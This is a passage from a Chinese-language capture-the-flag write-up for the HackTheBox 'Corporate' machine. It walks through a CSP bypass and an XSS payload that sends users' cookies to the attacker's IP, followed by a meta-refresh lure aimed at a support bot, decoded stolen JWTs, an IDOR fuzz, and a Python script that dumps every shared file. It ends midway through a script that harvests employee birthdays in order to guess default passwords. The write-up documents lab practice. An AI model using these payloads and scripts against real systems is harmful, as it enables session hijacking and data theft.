+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Analytics</span> = _analytics.<span class="title function_">init</span>(&#123;</span><br><span class="line">  <span class="attr">app</span>: <span class="string">&#x27;corporate-landing&#x27;</span>,</span><br><span class="line">  <span class="attr">version</span>: <span class="number">100</span>,</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;corporate-analytics&#x27;</span>,</span><br><span class="line">      <span class="attr">page</span>: <span class="function">(<span class="params">&#123; payload: _0x401b79 &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&#x27;/analytics/page&#x27;</span>, &#123;</span><br><span class="line">          <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">          <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">          <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(_0x401b79),</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">track</span>: <span class="function">(<span class="params">&#123; payload: _0x930340 &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&#x27;/analytics/track&#x27;</span>, &#123;</span><br><span class="line">          <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">          <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">          <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(_0x930340),</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">identify</span>: <span class="function">(<span class="params">&#123; payload: _0x5cdcc5 &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&#x27;/analytics/init&#x27;</span>, &#123;</span><br><span class="line">          <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">          <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">          <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(_0x5cdcc5),</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="title class_">Analytics</span>.<span class="title function_">identify</span>(mane.<span class="title function_">toString</span>())</span><br><span class="line"><span class="title class_">Analytics</span>.<span class="title function_">page</span>()</span><br><span class="line"><span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;a&#x27;</span>)).<span class="title function_">forEach</span>(<span class="function">(<span class="params">_0x40e926</span>) =&gt;</span> &#123;</span><br><span class="line">  _0x40e926.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title class_">Analytics</span>.<span class="title function_">track</span>(<span class="string">&#x27;click&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">text</span>: _0x40e926.<span class="property">textContent</span>,</span><br><span class="line">      <span class="attr">href</span>: _0x40e926.<span class="property">href</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;form-submit&#x27;</span>) &amp;&amp;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;form-submit&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title class_">Analytics</span>.<span class="title function_">track</span>(<span class="string">&#x27;sup-sent&#x27;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>從上面可以看到 <code>mane</code>​ 直接調用了函數名</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223154844-opajqqs.png" alt="image">​</p>
+<p>然後觀察這個網頁，居然也存在XSS注入，如果寫入 <code>&lt;script&gt;alert(1);&lt;/script&gt;</code>​ </p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223155413-cng9nyj.png" alt="image">​</p>
+<p>正如上面所説，CSP允許使用内部的函數跳轉，但不可以直接在html使用<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>​，允許<code>&lt;script src=&quot;http://localhost/a.js&quot;&gt; &lt;script/&gt;</code>​。</p>
+<p>第一次嘗試，强行加載壞壞的js讓他彈個框看看。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223160424-oc4x3c5.png" alt="image">​</p>
+<p>因爲mane是可以控制的，輸入 <code>); alert(111111); //</code>​  就會變成右邊那個樣子</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223160534-ucacdye.png" alt="image">​</p>
+<p>複製這堆東西貼入主頁就知道工不工作了。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223161038-whu1ksd.png" alt="image">​</p>
+<p>然後慢慢去調整payload，要不就少了個左括號，要不就少了個數字。直到出現了另一個函數錯誤就説明對齊成功了，這個時候把他輸入到主頁看看。</p>
+<p>調整完成的payload如下： <code>1));alert(111111);//</code>​</p>
+<p>如下：<code>http://corporate.htb/https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/js/analytics.min.js?v=1));alert(111111);//</code>​</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Analytics</span> = _analytics.<span class="title function_">init</span>(&#123;</span><br><span class="line">  <span class="attr">app</span>: <span class="string">&#x27;corporate-landing&#x27;</span>,</span><br><span class="line">  <span class="attr">version</span>: <span class="number">100</span>,</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;corporate-analytics&#x27;</span>,</span><br><span class="line">      <span class="attr">page</span>: <span class="function">(<span class="params">&#123; payload: _0x401b79 &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&#x27;/analytics/page&#x27;</span>, &#123;</span><br><span class="line">          <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">          <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">          <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(_0x401b79),</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">track</span>: <span class="function">(<span class="params">&#123; payload: _0x930340 &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&#x27;/analytics/track&#x27;</span>, &#123;</span><br><span class="line">          <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">          <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">          <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(_0x930340),</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">identify</span>: <span class="function">(<span class="params">&#123; payload: _0x5cdcc5 &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&#x27;/analytics/init&#x27;</span>, &#123;</span><br><span class="line">          <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">          <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">          <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(_0x5cdcc5),</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="title class_">Analytics</span>.<span class="title function_">identify</span>(<span class="number">1</span>)</span><br><span class="line"><span class="title function_">alert</span>(<span class="number">111111</span>)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到32行多出了一個 alert。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223161632-g1ohddj.png" alt="image">​</p>
+<p>如果貼入到，看到<code>_analytics</code>​ 函數未定義，所以在之前還要再加載一個js去定義<code>_analytics</code>​ 函數 <code>&lt;script src=&quot;/vendor/analytics.min.js&quot;&gt;&lt;/script&gt;</code>​ 。</p>
+<p>完整的payload如下：<code>&lt;script src=&quot;/vendor/analytics.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://corporate.htb/https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/js/analytics.min.js?v=1));alert(111111);//&quot;&gt;&lt;/script&gt;</code>​</p>
+<p>測試：<code>http://corporate.htb/&lt;script src=&quot;/vendor/analytics.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;http://corporate.htb/https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/js/analytics.min.js?v=1));alert(111111);//&quot;&gt;&lt;/script&gt;</code>​ </p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223161857-1xguc16.png" alt="image">​</p>
+<p>但是我們的目的是XSS攻擊，所以要嘗試跳轉。</p>
+<p>因爲雙引號和單引號會搞亂我們的payload，所以盡可能不適用單引號和雙引號，所以用一些巧妙的方法去跳轉。</p>
+<p>跳轉測試：<code>http://corporate.htb/&lt;script src=&quot;/vendor/analytics.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;http://corporate.htb/https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/js/analytics.min.js?v=1));document.location=String.fromCharCode(104,116,116,112,58,47,47,49,48,46,49,48,46,49,54,46,49,55,47);//&quot;&gt;&lt;/script&gt;</code>​</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223162520-bwyr3yb.png" alt="image">​</p>
+<p>加上cookie ： ​<code>http://corporate.htb/&lt;script src=&quot;/vendor/analytics.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;http://corporate.htb/https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/js/analytics.min.js?v=1));document.location=String.fromCharCode(104,116,116,112,58,47,47,49,48,46,49,48,46,49,54,46,49,55,47).concat(btoa(document.cookie));//&quot;&gt;&lt;/script&gt;</code>​</p>
+<h2 id="0x4-support-發給機器人看看"><a href="#0x4-support-發給機器人看看" class="headerlink" title="0x4 support 發給機器人看看"></a>0x4 support 發給機器人看看</h2><p>僞造一個類似 iframe 的東西 <code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=xxxxxxxxxxxx&quot;/&gt;</code>​</p>
+<p>把上面的payload換成單引號，如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;refresh&quot;</span> content=<span class="string">&quot;0; url=http://corporate.htb/&lt;script src=&#x27;/vendor/analytics.min.js&#x27;&gt;&lt;/script&gt;&lt;script src=&#x27;/https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/js/analytics.min.js?v=1));document.location=String.fromCharCode(104,116,116,112,58,47,47,49,48,46,49,48,46,49,54,46,49,55,47).concat(btoa(document.cookie));//&#x27;&gt;&lt;/script&gt;&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223163806-a8r0z4t.png" alt="image">​</p>
+<p>base64 解密一下，得到：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CorporateSSO=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA3MCwibmFtZSI6Ikhlcm1pbmEiLCJzdXJuYW1lIjoiTGV1c2Noa2UiLCJlbWFpbCI6Ikhlcm1pbmEuTGV1c2Noa2VAY29ycG9yYXRlLmh0YiIsInJvbGVzIjpbInNhbGVzIl0sInJlcXVpcmVDdXJyZW50UGFzc3dvcmQiOnRydWUsImlhdCI6MTcwMzA4MzYyOSwiZXhwIjoxNzAzMTcwMDI5fQ.9AzZ_SOJItfAZWY-v52pFntKEkodncV1ZiG7P76NyI0</span><br></pre></td></tr></table></figure>
+
+<p>jwt.io 一下看看：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">5077</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Cecelia&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;surname&quot;</span><span class="punctuation">:</span> <span class="string">&quot;West&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Cecelia.West@corporate.htb&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;roles&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;sales&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;requireCurrentPassword&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1703320635</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1703407035</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>這個時候我在好奇一件事情，爲什麽id是5077，所以打算再獲取多一次看看。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223172325-ac0xlyh.png" alt="image">​</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">5074</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Nora&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;surname&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Brekke&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Nora.Brekke@corporate.htb&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;roles&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;sales&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;requireCurrentPassword&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1703323373</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1703409773</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>拿到了兩個用戶，嘗試登陸進去看看</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231222152213-okv6woa.png" alt="image">​</p>
+<p>清除掉所有cookie，然后把上列的cookie加入到 <code>people.corporate.htb</code>​ 就可以访问</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223173006-lo1odmk.png" alt="image">​</p>
+<p>記得這裏的Path 是 <code>/</code>​ </p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231220230415-88rq059.png" alt="image">​</p>
+<h2 id="0x5-查找敏感文件"><a href="#0x5-查找敏感文件" class="headerlink" title="0x5 查找敏感文件"></a>0x5 查找敏感文件</h2><p>來到文件分享，</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231222154336-j2jzdnk.png" alt="image">​</p>
+<p>感覺share的功能怪怪的，</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231222154400-zvhv0lb.png" alt="image">​</p>
+<p>只有目的地，沒有一開始的聯係人。</p>
+<p>如果自己分享給自己</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231222153549-pie8nxz.png" alt="image">​</p>
+<p>就會報錯，但如果分享給另一個用戶倒是沒有報錯。</p>
+<p>現在獲得了兩個用戶，用無痕瀏覽器去加載另一個用戶，嘗試分享不存在的文件</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231222152929-hejai7s.png" alt="image">​</p>
+<p>是不是有這個漏洞。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231222154029-pi4j0r6.png" alt="image">​</p>
+<p>結果有，也就是說這個api只是檢查email那個是不是自己，并不檢查文件的所有者。</p>
+<p>因爲不能分享給自己，可以分享給別人，這樣我只要無限分享給別人，FUZZ一下就可以列出所有文件了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 建立一個 0 - 10000的字典</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> &#123;1..10000&#125;; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$x</span> &gt;&gt; fuzzdict.txt ; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改fileId變成想要的FUZZ的地方</span></span><br><span class="line">vim req</span><br><span class="line"></span><br><span class="line"><span class="comment"># ffuf times</span></span><br><span class="line">ffuf -request req -w fuzzdict.txt -request-proto http</span><br></pre></td></tr></table></figure>
+
+<p>​​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223173740-9cfg8jb.png" alt="image">​​</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231222154859-butkyn0.png" alt="image">​</p>
+<p>得到大量的文件</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223173852-dmgrss2.png" alt="image">​</p>
+<p>嘗試把所有的文件給dump出來</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line">OUTPUT_DIR = <span class="string">&quot;out&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    burp0_url = <span class="string">&quot;http://people.corporate.htb:80/sharing/file/%s&quot;</span> % (x)</span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;CorporateSSO&quot;</span>: <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA2OSwibmFtZSI6IkphbW1pZSIsInN1cm5hbWUiOiJDb3JrZXJ5IiwiZW1haWwiOiJKYW1taWUuQ29ya2VyeUBjb3Jwb3JhdGUuaHRiIiwicm9sZXMiOlsic2FsZXMiXSwicmVxdWlyZUN1cnJlbnRQYXNzd29yZCI6dHJ1ZSwiaWF0IjoxNzAzMTQyNDUwLCJleHAiOjE3MDMyMjg4NTB9.6vRoHJRzdLy1KFmbXMS1b-YcR0vBpq9ohYQaozt4bGg&quot;</span>, <span class="string">&quot;session&quot;</span>: <span class="string">&quot;eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfX0=&quot;</span>, <span class="string">&quot;session.sig&quot;</span>: <span class="string">&quot;6ZFyxwEHrjOf9vL2-OgzXPQb8hE&quot;</span>&#125;</span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;en-US,en;q=0.5&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://people.corporate.htb/sharing&quot;</span>, <span class="string">&quot;DNT&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    req = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)</span><br><span class="line">    <span class="keyword">if</span> (req.status_code == <span class="number">200</span>):</span><br><span class="line">        read_header = (req.headers[<span class="string">&quot;Content-Disposition&quot;</span>])</span><br><span class="line">        filename = read_header[read_header.find(<span class="string">&quot;filename&quot;</span>)+<span class="number">10</span>: -<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] %s : Found %s ...&quot;</span> % (x,filename))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> Path(OUTPUT_DIR).exists():</span><br><span class="line">            Path(OUTPUT_DIR).mkdir()</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(OUTPUT_DIR + <span class="string">&quot;/&quot;</span> + filename, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(req.content)</span><br><span class="line">            f.close()</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223173936-vm5y47c.png" alt="image">​</p>
+<p>有個PDF文件，打開看看</p>
+<p>​​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223174102-lrslpxr.png" alt="image">​​</p>
+<p>這裏的提示是初始密碼是：<code>CorporateStarterDDMMYYYY</code>​ ，生日在系統上就可以獲得。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223174143-eo9smtc.png" alt="image">​</p>
+<p>然後ID是5000開始，所以開始dump 所有的email 和 生日，做成一個字典。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">save = <span class="built_in">open</span>(<span class="string">&#x27;save.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5001</span>,<span class="number">6000</span>):</span><br><span class="line">    <span class="keyword">import</span> requests</span><br><span class="line">    burp0_url = <span class="string">&quot;http://people.corporate.htb:80/employee/%s&quot;</span> % x</span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;CorporateSSO&quot;</span>: <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA3NywibmFtZSI6IkNlY2VsaWEiLCJzdXJuYW1lIjoiV2VzdCIsImVtYWlsIjoiQ2VjZWxpYS5XZXN0QGNvcnBvcmF0ZS5odGIiLCJyb2xlcyI6WyJzYWxlcyJdLCJyZXF1aXJlQ3VycmVudFBhc3N3b3JkIjp0cnVlLCJpYXQiOjE3MDMzMjA2MzUsImV4cCI6MTcwMzQwNzAzNX0.Ohap3nxoaSakVhDokLZhsst7Sr0OZq82JGMWEP9S2uI&quot;</span>, <span class="string">&quot;session&quot;</span>: <span 